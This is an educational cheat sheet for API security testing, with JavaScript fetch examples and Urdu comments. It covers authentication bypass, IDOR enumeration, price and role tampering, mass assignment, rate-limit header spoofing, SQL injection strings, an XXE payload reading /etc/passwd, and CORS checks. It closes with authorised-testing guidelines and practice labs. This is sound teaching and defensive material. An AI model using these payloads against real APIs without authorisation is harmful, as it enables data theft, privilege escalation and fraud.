# API Security Testing Cheat Sheet 🛡️

## Common Vulnerabilities & Testing Methods

### 1. Broken Authentication 🔓

#### Test Cases:
```javascript
// Test 1: No Authentication
fetch('https://api.example.com/user/profile')
  .then(res => res.json())
  .then(data => console.log(data));

// Test 2: Invalid Token
fetch('https://api.example.com/user/profile', {
  headers: {
    'Authorization': 'Bearer invalid_token_123'
  }
});

// Test 3: Expired Token
// پرانا token استعمال کریں اور دیکھیں کہ API access ہو رہا ہے یا نہیں

// Test 4: Token Manipulation
// JWT token کو decode کریں اور data modify کریں
```

---

### 2. IDOR (Insecure Direct Object References) 🎯

#### Test Cases:
```javascript
// Test 1: Sequential ID Testing
for (let id = 1; id <= 100; id++) {
  fetch(`https://api.example.com/users/${id}`)
    .then(res => res.json())
    .then(data => console.log(`User ${id}:`, data));
}

// Test 2: GUID Enumeration
const guids = ['uuid1', 'uuid2', 'uuid3'];
guids.forEach(guid => {
  fetch(`https://api.example.com/documents/${guid}`)
    .then(res => res.json())
    .then(data => console.log(data));
});

// Test 3: Other User's Data Access
// اپنی user ID کی جگہ دوسرے کی ID try کریں
fetch('https://api.example.com/orders/OTHER_USER_ID')
  .then(res => res.json())
  .then(data => console.log(data));
```

---

### 3. Parameter Tampering 🔧

#### Test Cases:
```javascript
// Test 1: Price Manipulation
fetch('https://api.example.com/checkout', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    productId: 123,
    price: 0.01,  // Original price 100 تھی
    quantity: 1
  })
});

// Test 2: Role Modification
fetch('https://api.example.com/user/update', {
  method: 'PUT',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    userId: 'your_id',
    role: 'admin'  // Try to escalate privileges
  })
});

// Test 3: Boolean Manipulation
fetch('https://api.example.com/user/update', {
  method: 'PUT',
  body: JSON.stringify({
    isAdmin: true,
    isPremium: true,
    isVerified: true
  })
});
```

---

### 4. Mass Assignment 📝

#### Test Cases:
```javascript
// Test: Extra Parameters بھیجنا
fetch('https://api.example.com/register', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    username: 'testuser',
    password: 'password123',
    email: 'test@example.com',
    // Extra parameters جو documentation میں نہیں ہیں:
    isAdmin: true,
    credits: 999999,
    verified: true,
    role: 'admin'
  })
});
```

---

### 5. Rate Limiting Bypass 🚀

#### Test Cases:
```javascript
// Test 1: Rapid Requests
async function testRateLimit() {
  for (let i = 0; i < 1000; i++) {
    fetch('https://api.example.com/sensitive-endpoint')
      .then(res => console.log(`Request ${i}: ${res.status}`));
  }
}

// Test 2: IP Rotation (conceptual)
// Different IPs یا proxies استعمال کریں

// Test 3: Header Manipulation
const headers = [
  { 'X-Forwarded-For': '1.1.1.1' },
  { 'X-Forwarded-For': '2.2.2.2' },
  { 'X-Real-IP': '3.3.3.3' }
];
```

---

### 6. SQL Injection in APIs 💉

#### Test Payloads:
```javascript
// Test 1: Basic SQL Injection
fetch(`https://api.example.com/search?query=' OR '1'='1`)
  .then(res => res.json())
  .then(data => console.log(data));

// Test 2: Union-based
fetch(`https://api.example.com/user?id=1 UNION SELECT * FROM passwords`)
  .then(res => res.json())
  .then(data => console.log(data));

// Test 3: In POST Body
fetch('https://api.example.com/login', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    username: "admin' --",
    password: "anything"
  })
});
```

---

### 7. XXE (XML External Entity) 📄

#### Test Payloads:
```javascript
// Test: XXE Injection
const xmlPayload = `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>`;

fetch('https://api.example.com/xml-endpoint', {
  method: 'POST',
  headers: { 'Content-Type': 'application/xml' },
  body: xmlPayload
});
```

---

### 8. CORS Misconfiguration 🌐

#### Test Cases:
```javascript
// Test 1: Origin Header Manipulation
fetch('https://api.example.com/data', {
  headers: {
    'Origin': 'https://evil.com'
  }
})
.then(res => {
  console.log('CORS Headers:', res.headers.get('Access-Control-Allow-Origin'));
});

// Test 2: Credentials with Wildcard
// چیک کریں کہ Access-Control-Allow-Origin: * 
// اور Access-Control-Allow-Credentials: true دونوں ساتھ ہیں یا نہیں
```

---

### 9. API Key Leakage 🔑

#### Where to Look:
```javascript
// Test 1: JavaScript Files میں
// Browser Developer Tools > Sources میں .js files search کریں

// Test 2: Error Messages میں
fetch('https://api.example.com/invalid-endpoint')
  .then(res => res.text())
  .then(text => console.log(text)); // Error میں sensitive data?

// Test 3: Response Headers میں
fetch('https://api.example.com/data')
  .then(res => {
    for (let [key, value] of res.headers.entries()) {
      console.log(`${key}: ${value}`);
    }
  });
```

---

### 10. HTTP Verb Tampering 🔄

#### Test Cases:
```javascript
// Test: Different HTTP Methods try کریں
const methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS'];

methods.forEach(method => {
  fetch('https://api.example.com/admin/delete-user', {
    method: method
  })
  .then(res => console.log(`${method}: ${res.status}`));
});
```

---

## Testing Workflow 📋

### 1. Reconnaissance
```javascript
// Information Gathering
// - API endpoints discover کریں
// - Documentation پڑھیں
// - Network tab monitor کریں
```

### 2. Authentication Testing
```javascript
// Auth mechanisms test کریں
// - Weak passwords
// - Token expiration
// - Session management
```

### 3. Authorization Testing
```javascript
// Access controls test کریں
// - Horizontal privilege escalation
// - Vertical privilege escalation
// - Function-level access
```

### 4. Input Validation
```javascript
// Input handling test کریں
// - SQL injection
// - XSS
// - Command injection
// - XXE
```

### 5. Business Logic
```javascript
// Application logic test کریں
// - Race conditions
// - Business flow bypass
// - Price manipulation
```

---

## Useful Headers for Testing 🎯

```javascript
const testHeaders = {
  // Authentication
  'Authorization': 'Bearer YOUR_TOKEN',
  'X-API-Key': 'YOUR_API_KEY',
  
  // Content Type
  'Content-Type': 'application/json',
  'Accept': 'application/json',
  
  // Custom Headers
  'X-Forwarded-For': '127.0.0.1',
  'X-Real-IP': '127.0.0.1',
  'X-Originating-IP': '127.0.0.1',
  'X-Remote-IP': '127.0.0.1',
  'X-Client-IP': '127.0.0.1',
  
  // User Agent
  'User-Agent': 'CustomAgent/1.0',
  
  // Origin
  'Origin': 'https://example.com',
  'Referer': 'https://example.com'
};
```

---

## Response Status Codes to Watch 📊

```
200 OK - Success
201 Created - Resource created
204 No Content - Success with no body

400 Bad Request - Invalid input
401 Unauthorized - Authentication required
403 Forbidden - Not authorized
404 Not Found - Resource doesn't exist
405 Method Not Allowed - HTTP method issue
429 Too Many Requests - Rate limited

500 Internal Server Error - Server error
502 Bad Gateway - Proxy error
503 Service Unavailable - Server down
```

---

## Safety Guidelines ⚠️

1. **صرف authorized testing کریں**
2. **Bug bounty programs follow کریں**
3. **Production environments پر احتیاط سے test کریں**
4. **Data destruction سے بچیں**
5. **Rate limits respect کریں**
6. **Responsible disclosure practice کریں**

---

## Helpful Tools 🛠️

- **Burp Suite**: Web proxy اور scanner
- **Postman**: API testing tool
- **OWASP ZAP**: Security testing tool
- **Browser DevTools**: Network analysis
- **curl**: Command-line testing
- **JWT.io**: JWT token decoder

---

## Practice Resources 🎓

- **Damn Vulnerable Web Application (DVWA)**
- **OWASP WebGoat**
- **HackTheBox**
- **TryHackMe**
- **PortSwigger Web Security Academy**

---

Made for Learning Purposes Only 📚
